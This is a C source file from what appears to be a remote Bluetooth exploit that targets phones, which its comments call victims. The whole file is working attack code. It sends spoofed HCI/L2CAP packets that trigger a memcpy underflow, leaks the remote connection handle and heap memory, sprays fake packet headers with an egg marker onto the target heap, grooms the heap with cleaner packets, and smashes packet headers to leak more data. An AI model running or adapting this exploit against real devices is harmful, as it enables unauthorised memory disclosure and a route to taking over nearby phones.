#include "leak.h"

#include "log.h"

#include <stdlib.h>
#include <unistd.h>

#include <time.h>

// The following #defines represent host (attacker) to victim (phone) conversions (or vice versa)
// They are added for completeness, and to make migration easier in case someone insanely targets a non-existent big-endian phone...
#define htovs(d) (d)
#define htovl(d) (d)
#define htovll(d) (d)
#define vtohs(d) (d)
#define vtohl(d) (d)
#define vtohll(d) (d)

// #define LEAK_SPRAY_TRY_COUNT (4u)
// #define LEAK_SPRAY_COUNT (64u)
#define LEAK_SPRAY_TRY_COUNT (8u)
#define LEAK_SPRAY_COUNT (32u)

// print (size_t)malloc_usable_size(0x7bf602ce31)print (size_t)malloc_usable_size(0x7020943000)
#define LEAK_SPRAY_CHUNK_SIZE ((size_t)512u)
#define LEAK_SPRAY_PACKET_SIZE (LEAK_SPRAY_CHUNK_SIZE - sizeof(struct bluetooth_remote_header))

#define LEAK_EGG ("\xDE\xAD\xBE\xEF\xBA\xDC\x0D\xED")
#define LEAK_EGG_SIZE (sizeof(LEAK_EGG) - 1)

#define LEAK_CLEANER_PACKET_SIZE ((size_t)128u)

#define LEAK_MEMCPY_UNDERFLOW_SIZE ((size_t)66u)

#define LEAK_FANCY_TARGET_PACKET_IDENTIFIER ((uint8_t)42u)
#define LEAK_FANCY_TARGET_PACKET_SIZE (LEAK_MEMCPY_UNDERFLOW_SIZE - sizeof(struct bluetooth_remote_header) + offsetof(struct bluetooth_remote_header, hci_header))

#define LEAK_AMOUNT ((uint16_t)0x280)

#define LEAK_SPRAY_PACKET_FILLER ('L')
#define LEAK_TARGET_PACKET_FILLER ('T')
#define LEAK_SMASHER_PACKET_FILLER ('S')
#define LEAK_CLEANER_PACKET_FILLER ('C')

#define LEAK_HEAP_CLEANER_PACKET_COUNT ((size_t)0x180)
#define LEAK_ID_CLEANER_CHUNK_SIZE ((size_t)32)
#define LEAK_ID_CLEANER_PACKET_SIZE ((size_t)LEAK_ID_CLEANER_CHUNK_SIZE - sizeof(struct bluetooth_remote_header))

static err_t leak_simple_sized(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, struct bluetooth_l2cap_header **packet, size_t first_packet_size, size_t second_packet_size);

err_t leak_simple(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, struct bluetooth_l2cap_header **packet)
{
    LOGL_INFO("Attempting simple leak...\n")

    leak_simple_sized(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, packet, LEAK_MEMCPY_UNDERFLOW_SIZE, LEAK_MEMCPY_UNDERFLOW_SIZE);

    return NULL;
}

err_t leak_fancy(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, uint8_t **data, size_t *data_size)
{
    LOGL_INFO("Attempting fancy leak...\n")

    ////////////
    // Step 1 //
    ////////////
    LOGL_INFO("Step1: Using simple leak to leak remote handle\n")
    struct bluetooth_l2cap_header *packet = NULL;
    ERR_FWD(leak_simple(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, &packet));
    logl_hex(packet->data, packet->len);

    struct bluetooth_header *leaked_header = (struct bluetooth_header *)(packet->data + packet->len - 2 - offsetof(struct bluetooth_header, acl_header));
    uint16_t leaked_handle = BLUETOOTH_HCI_HANDLE_VALUE_MASK & leaked_header->hci_header.handle;
    // LOGL_DBG_VAR(leaked_handle, "%" PRIu16)

    free(packet);
    packet = NULL;

    LOGL_SUCCESS("Leaked remote handle = %" PRIu16 "\n", leaked_handle)

    ////////////
    // Step 2 //
    ////////////
    LOGL_INFO("Step 2: Creating the fake packet...\n")
    uint8_t spray_packet_data[LEAK_SPRAY_PACKET_SIZE];
    memset(spray_packet_data, LEAK_SPRAY_PACKET_FILLER, sizeof(spray_packet_data));

    struct bluetooth_remote_header *fake_header = (struct bluetooth_remote_header *)(spray_packet_data                                                                   // We are now at the start of the packet
                                                                                     + LEAK_SPRAY_PACKET_SIZE                                                            // We are now at the end of the packet
                                                                                     - LEAK_MEMCPY_UNDERFLOW_SIZE + offsetof(struct bluetooth_remote_header, acl_header) // We are now at the location where the leak will start
                                                                                     - offsetof(struct bluetooth_remote_header, hci_header));                            // We are shifting the header to make the leak start at the beginning of the hci header
    memcpy(spray_packet_data + LEAK_SPRAY_PACKET_SIZE - LEAK_EGG_SIZE, LEAK_EGG, LEAK_EGG_SIZE);

    // struct bluetooth_header fake_header;
    ERR_FWD(bluetooth_remote_header_spoof(leaked_handle, LEAK_FANCY_TARGET_PACKET_IDENTIFIER, 0, false, LEAK_AMOUNT, fake_header));

    LOGL_DBG_INFO("Fake packet data:\n")
    logl_hex(spray_packet_data, LEAK_SPRAY_PACKET_SIZE);

    LOGL_SUCCESS("Created fake packet\n")

    ////////////
    // Step 3 //
    ////////////
    LOGL_INFO("Step 3: Spraying fake packet data on target heap...\n")

    bool leak_egg_found = false;
    for (size_t i = 0; i < LEAK_SPRAY_TRY_COUNT && !leak_egg_found; i++)
    {
        for (size_t j = 0; j < LEAK_SPRAY_COUNT; j++)
        {
            uint8_t chosen_packet_id = *packet_id;
            // LOGL_DBG_VAR(chosen_packet_id, "%" PRIu8);

            LOGL_CLEAR()
            LOGL_INFO("Spraying fake packet %zu/%u...", j, LEAK_SPRAY_COUNT)
            ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, chosen_packet_id, 0, false, spray_packet_data, LEAK_SPRAY_PACKET_SIZE))
            ERR_FWD(bluetooth_inc_packet_id(packet_id))

            ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, chosen_packet_id));
            // msleep(30);

            free(packet);
            packet = NULL;
        }

        LOGL_CLEAR()
        LOGL_INFO("Testing if fake packet was sprayed correctly...\n")

        ERR_FWD(leak_simple_sized(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, &packet, LEAK_MEMCPY_UNDERFLOW_SIZE, LEAK_SPRAY_PACKET_SIZE));
        logl_hex(packet->data, packet->len);

        // Check if a matching leak egg is found
        const size_t leak_egg_offset = packet->len                                            // We are now at the end of the packet
                                       - 2                                                    // We are now at the start of the leaked acl_header
                                       - offsetof(struct bluetooth_remote_header, acl_header) // We are now at the start of the leaked BT_HDR
                                       - LEAK_EGG_SIZE;                                       // We are now at the start of the leaked LEAK_EGG
        if (memcmp(packet->data + leak_egg_offset, LEAK_EGG, LEAK_EGG_SIZE) == 0)
            leak_egg_found = true;

        free(packet);
        packet = NULL;

        if (!leak_egg_found)
            LOGL_WARNING("Could not find leak egg in packet data\n")
    }

    if (leak_egg_found)
        LOGL_SUCCESS("Spray was successful\n")
    else
        ERR_RET("SPRAY_FAILED", "Could not find leak egg in any of the packets")

    ////////////
    // Step 4 //
    ////////////
    LOGL_INFO("Step 4: Sending heap cleaner packets...\n")
    uint8_t heap_cleaner_packet_buffer[LEAK_FANCY_TARGET_PACKET_SIZE];
    memset(heap_cleaner_packet_buffer, LEAK_CLEANER_PACKET_FILLER, LEAK_FANCY_TARGET_PACKET_SIZE);
    for (size_t i = 0; i < LEAK_HEAP_CLEANER_PACKET_COUNT; i++)
    {
        LOGL_CLEAR()
        LOGL_INFO("Sending heap cleaner packet %zu/%zu...", i, LEAK_HEAP_CLEANER_PACKET_COUNT)
        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, false, heap_cleaner_packet_buffer, sizeof(heap_cleaner_packet_buffer)))
        ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, *packet_id));

        ERR_FWD(bluetooth_inc_packet_id(packet_id))
    }
    LOGL_CLEAR()
    LOGL_INFO("Sent %zu heap cleaner packets\n", LEAK_HEAP_CLEANER_PACKET_COUNT)

    ////////////
    // Step 5 //
    ////////////
    LOGL_INFO("Step 5: Attempting smash of packet header...\n")

    uint8_t target_packet_buffer[LEAK_FANCY_TARGET_PACKET_SIZE];
    memset(target_packet_buffer, LEAK_TARGET_PACKET_FILLER, LEAK_FANCY_TARGET_PACKET_SIZE);
    uint8_t smasher_packet_buffer[LEAK_SPRAY_PACKET_SIZE];
    memset(smasher_packet_buffer, LEAK_SMASHER_PACKET_FILLER, LEAK_SPRAY_PACKET_SIZE);
    uint8_t indentifier_cleaner_packet_buffer[LEAK_ID_CLEANER_CHUNK_SIZE];
    memset(indentifier_cleaner_packet_buffer, LEAK_CLEANER_PACKET_FILLER, LEAK_ID_CLEANER_CHUNK_SIZE);

    for (size_t i = 0; /* i < 50 */; i++)
    {
        // This (commented) is the normal and expected method to iterate over the ids and reach the correct ID (the one we sprayed)
        // This method is slow and takes a lot of time to reach the correct ID 
        // while (*packet_id != LEAK_FANCY_TARGET_PACKET_IDENTIFIER)
        // {
        //     LOGL_CLEAR()
        //     LOGL_DBG_INFO("Sending packet identifier cleaner packet with id %" PRIu8 "...", *packet_id)
        //     ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, false, indentifier_cleaner_packet_buffer, LEAK_ID_CLEANER_CHUNK_SIZE))
        //     ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, *packet_id));

        //     if (LEAK_FANCY_TARGET_PACKET_IDENTIFIER - *packet_id > 10)
        //     {
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //     }
        //     ERR_FWD(bluetooth_inc_packet_id(packet_id))
        // }

        // This is a more aggressive method to iterate over the ids and reach the correct ID (the one we sprayed)
        // It does so by only sending one packet that is on the other side of the spectrum of IDs, this allows us to only send 1 packet and be able to use the correct ID afterwards
        *packet_id = 0xff - LEAK_FANCY_TARGET_PACKET_IDENTIFIER;
        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, false, indentifier_cleaner_packet_buffer, LEAK_ID_CLEANER_CHUNK_SIZE))
        ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, *packet_id));
        *packet_id = LEAK_FANCY_TARGET_PACKET_IDENTIFIER;

        LOGL_INFO("Attempting data leak %zu...\n", i)
        uint8_t chosen_packet_id = *packet_id;
        // LOGL_DBG_VAR(chosen_packet_id, "%" PRIu8);

        // Send the two packets
        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, chosen_packet_id, 2, false, target_packet_buffer, sizeof(target_packet_buffer)))
        ERR_FWD(bluetooth_inc_packet_id(packet_id))

        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, smasher_packet_buffer, sizeof(smasher_packet_buffer)))
        ERR_FWD(bluetooth_inc_packet_id(packet_id))

        // Receive the leak packet (hopefully)
        ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, chosen_packet_id));

        logl_hex(packet->data, packet->len);
        LOGL_SUCCESS("Successfully leaked heap data\n")
    }

    LOGL_INFO("BRUH no\n")

    return NULL;
}

static err_t leak_simple_sized(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, struct bluetooth_l2cap_header **packet, size_t first_packet_size, size_t second_packet_size)
{
    if (packet_id == NULL)
        ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

    uint8_t *buffer = NULL;
    uint8_t chosen_packet_id = *packet_id;
    LOGL_DBG_VAR(chosen_packet_id, "%" PRIu8);

    // Send the trigger packets
    buffer = (uint8_t *)malloc(first_packet_size);
    memset(buffer, 'A', first_packet_size);
    ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, buffer, first_packet_size))
    ERR_FWD(bluetooth_inc_packet_id(packet_id))
    free(buffer);

    buffer = (uint8_t *)malloc(second_packet_size);
    memset(buffer, 'B', second_packet_size);
    ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, buffer, second_packet_size))
    ERR_FWD(bluetooth_inc_packet_id(packet_id))
    free(buffer);

    // Receive the echo packet
    ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, packet, chosen_packet_id));

    // Just a fallback
    return NULL;
}